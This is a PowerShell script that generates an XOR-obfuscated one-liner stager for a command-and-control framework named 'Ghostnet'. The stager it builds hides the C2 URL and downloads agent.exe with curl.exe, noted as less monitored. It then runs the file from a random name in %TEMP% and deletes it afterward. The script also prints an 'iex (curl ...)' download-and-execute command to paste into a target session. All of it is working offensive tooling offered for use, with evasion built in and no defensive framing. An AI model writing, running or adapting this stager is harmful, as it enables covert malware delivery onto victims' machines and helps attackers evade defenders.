<#
.SYNOPSIS
    Generate a XOR-obfuscated PowerShell one-liner stager for Ghostnet.

.DESCRIPTION
    Takes the C2 URL, XOR-encodes it, and produces a one-liner that:
    - Decodes the URL at runtime (no plaintext C2 in the script or logs)
    - Downloads agent.exe via curl.exe (LOLBin, less monitored than WebClient)
    - Writes to %TEMP% with a random filename
    - Executes the binary
    - Cleans up the binary after launch

    Output: copy the generated one-liner and paste into a target PowerShell session,
    or serve stager.ps1 from the C2 and use: iex (curl -s <c2>/payloads/stager.ps1)
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$C2Url,

    [Parameter(Mandatory = $false)]
    [int]$XorKey = 0x4F
)

# XOR-encode the URL
$encoded = @()
foreach ($c in $C2Url.ToCharArray()) {
    $encoded += [int]$c -bxor $XorKey
}
$encodedStr = $encoded -join ','

# Generate the one-liner
$oneliner = @"
`$k=$XorKey;`$u=-join([char[]]($encodedStr)|%{`$_-bxor`$k});`$f=`$env:temp+'\'+[io.path]::GetRandomFileName()+'.exe';curl.exe -s "`$u/payloads/agent.exe" -o "`$f";start "`$f";Start-Sleep 1;remove-item "`$f" -Force
"@

$oneliner | Set-Content -Path "$PSScriptRoot\stager.ps1" -Force

Write-Host "=== Generated stager.ps1 ===" -ForegroundColor Green
Write-Host "C2 URL: $C2Url" -ForegroundColor Cyan
Write-Host "XOR Key: 0x$('{0:X}' -f $XorKey)" -ForegroundColor Cyan
Write-Host "One-liner length: $($oneliner.Length) chars" -ForegroundColor Yellow
Write-Host ""
Write-Host "--- One-liner (paste into target PS session) ---" -ForegroundColor Green
Write-Host $oneliner -ForegroundColor White
Write-Host "--- End ---" -ForegroundColor Green
Write-Host ""
Write-Host "Or serve from C2 and use:" -ForegroundColor Yellow
Write-Host "iex (curl -s $C2Url/payloads/stager.ps1)" -ForegroundColor White
